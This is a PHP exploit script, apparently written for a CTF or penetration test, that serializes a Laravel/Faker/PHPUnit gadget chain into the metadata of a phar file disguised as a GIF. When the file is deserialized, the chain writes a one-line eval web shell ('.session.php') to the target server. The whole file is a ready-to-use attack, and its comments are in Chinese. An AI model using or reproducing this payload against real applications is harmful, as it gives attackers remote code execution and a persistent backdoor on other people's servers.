<?php
namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        protected $events;
        protected $event;
        function __construct($events, $event){
            $this->events = $events;
            $this->event = $event;
        }
    }
};
namespace Faker{
    class DefaultGenerator{
        protected $default;
        public function __construct($default = null){
            $this->default = $default;
        }
    }
    class ValidGenerator{
        protected $generator;
        protected $validator;
        protected $maxRetries;
        // __call方法中有call_user_func_array、call_user_func
        public function __construct($generator, $validator = null, $maxRetries = 10000)
        {
            $this->generator = $generator;
            $this->validator = $validator;
            $this->maxRetries = $maxRetries;
        }
    }
};
namespace PHPUnit\Framework\MockObject\Stub{
    class ReturnCallback
    {
        private $callback;
        public function __construct($callback)
        {
            $this->callback = $callback;
        }
    }
};
// namespace PHPUnit\Framework\MockObject\Invocation{
//     class StaticInvocation{
//         private $parameters;
//         public function __construct($parameters){
//             $this->parameters = $parameters;
//         }
//     }
// };
namespace PHPUnit\Framework\MockObject{
    class Invocation{
        private $parameters;
        public function __construct($parameters){
            $this->parameters = $parameters;
        }
    }
};
namespace{
    $function = 'file_put_contents';
    $parameters = array('.session.php','<? @eval($_POST["php_session_tmp"])?>');
    // $staticinvocation = new PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);
    $staticinvocation = new PHPUnit\Framework\MockObject\Invocation($parameters);
    $returncallback = new PHPUnit\Framework\MockObject\Stub\ReturnCallback($function);
    $defaultgenerator = new Faker\DefaultGenerator($staticinvocation);
    $validgenerator = new Faker\ValidGenerator($defaultgenerator,array($returncallback,'invoke'),2);
    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($validgenerator,123);
    $o = $pendingbroadcast;
    $filename = 'session.phar';// 后缀必须为phar，否则程序无法运行
    file_exists($filename) ? unlink($filename) : null;
    $phar=new Phar($filename);
    $phar->startBuffering();
    $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($o);
    $phar->addFromString("test.txt","bar");
    $phar->stopBuffering();
};

?>
